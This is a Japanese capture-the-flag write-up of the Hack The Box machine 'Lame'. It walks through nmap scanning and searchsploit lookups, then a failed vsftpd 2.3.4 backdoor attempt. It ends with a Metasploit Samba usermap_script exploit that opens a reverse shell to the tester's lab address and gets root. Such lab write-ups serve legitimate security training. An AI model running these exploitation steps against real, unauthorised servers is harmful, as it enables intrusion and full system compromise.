# はじめに
Hack The Boxの攻略などを自分用にまとめたものです。
主に記録用として記しています。
現在のランクはHackerです。
間違っていることも多いかと思いますが、よろしくお願いします。
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">
Twitter:@yukitsukai1731

# Lame
HackTheBox公式より
<img width="265" alt="スクリーンショット 2020-05-27 15.19.35.png" src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/d43f3496-414b-af40-84ca-0d0f58f50ae9.png">

Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.

Lameは初心者レベルのマシンで、ルートアクセスを得るために必要なエクスプロイトは1つだけです。Hack The Boxで公開された最初のマシンであり、引退するまでは新規ユーザーの最初のマシンであることが多かった。

# スキャン
Lame(10.10.10.3)に対して、スキャンを行います。
まずnmapからスキャンを開始します。
## nmap 
```
nmap -sC -sV -oN -Pn lame 10.10.10.3
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力
- -Pn...ping送信をせずにスキャンを行う

```
kali@kali:~/htb/Lame$ nmap -sC -sV -Pn -oN lame 10.10.10.3
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 02:11 EDT
Nmap scan report for 10.10.10.3
Host is up (0.38s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable                                                                            
|_End of status                                                                                                       
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)                                                
| ssh-hostkey:                                                                                                        
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)                                                        
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)                                                        
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3d00h54m04s, deviation: 2h49m45s, median: -3d02h54m06s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-05-23T23:18:11-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.94 seconds
```

ここで、21番ポートのvsftpd2.3.4と445番ポートのSamba smbd 3.0.20が気になります。
それぞれsearchsploitを使用して検索してみましょう。

```
kali@kali:~/htb/Lame$ searchsploit vsftpd 2.3.4
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                              | unix/remote/17491.rb
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

```
kali@kali:~/htb/Lame$ searchsploit Samba 3.0.20
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                              | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)    | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                               | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                               | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                       | linux_x86/dos/36741.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

これらの情報をもとに、侵入していきたいと思います。

# 侵入
まずはvsftpd2.3.4を使いたい思います。
vsftpd2.3.4はGoolgeで調べてみたところ、バックドアコードが含まれている時期がありました。
これを利用してみましょう。
僕が昔、このexploitコードを勉強がてら書いたことがあるので、それを利用したいと思います。
GitHub:
https://github.com/yukitsukai47/vsftpd2.3.4_exploit

```
kali@kali:~/htb/Lame$ python3 exploit.py 10.10.10.3
対象のサーバへ接続中...
対象のサーバにvsftpd2.3.4の脆弱性がありました.

攻撃を開始します
攻撃完了!
timed out
kali@kali:~/htb/Lame$
```

どうやらvsftpd2.3.4は使っているが、バックドアコードは取り除かれているもののようです。

次に、Samba 3.0.20の脆弱性を利用したものをmetasploitから実行してみましょう。
Samba 3.0.20はGoogleで調べたCVE-2007-2447とされています。

![スクリーンショット 2020-05-27 16.11.16.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/a1405547-fef8-d554-045b-d823c8e2c05a.png)



```
kali@kali:~/htb/Lame$ msfconsole -q
[*] Starting persistent handler(s)...
msf5 > search CVE-2007-2447

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


msf5 > use exploit/multi/samba/usermap_script 
msf5 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP double handler on 10.10.14.4:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo CHcW0IbpgJJIrdAq;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "sh: line 2: Connected: command not found\r\nsh: line 3: Escape: command not found\r\nCHcW0IbpgJJIrdAq\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.4:4444 -> 10.10.10.3:45255) at 2020-05-27 03:04:39 -0400


whoami
root
```

いきなりrootが得られました。
お疲れ様でした。